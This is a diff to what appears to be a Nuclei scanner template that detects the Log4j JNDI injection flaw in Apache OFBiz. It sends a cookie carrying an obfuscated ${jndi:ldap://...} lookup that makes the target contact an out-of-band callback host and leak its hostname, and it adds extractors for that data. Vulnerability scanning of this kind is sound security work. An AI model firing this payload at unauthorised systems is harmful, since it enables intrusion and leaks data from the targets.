@@ -22,12 +22,16 @@ info:
     shodan-query: http.html:"Apache OFBiz"
   tags: cve,cve2021,ofbiz,oast,log4j,rce,apache,jndi,kev
 
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
 http:
   - raw:
       - |
         GET /webtools/control/main HTTP/1.1
         Host: {{Hostname}}
-        Cookie: OFBiz.Visitor=${jndi:ldap://${hostName}.{{interactsh-url}}}
+        Cookie: OFBiz.Visitor=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.cookie.{{interactsh-url}}}
 
     matchers-condition: and
     matchers:
@@ -39,13 +43,23 @@ http:
       - type: regex
         part: interactsh_request
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
     extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
+
       - type: regex
         part: interactsh_request
         group: 1
         regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
 # Enhanced by mp on 2022/05/27
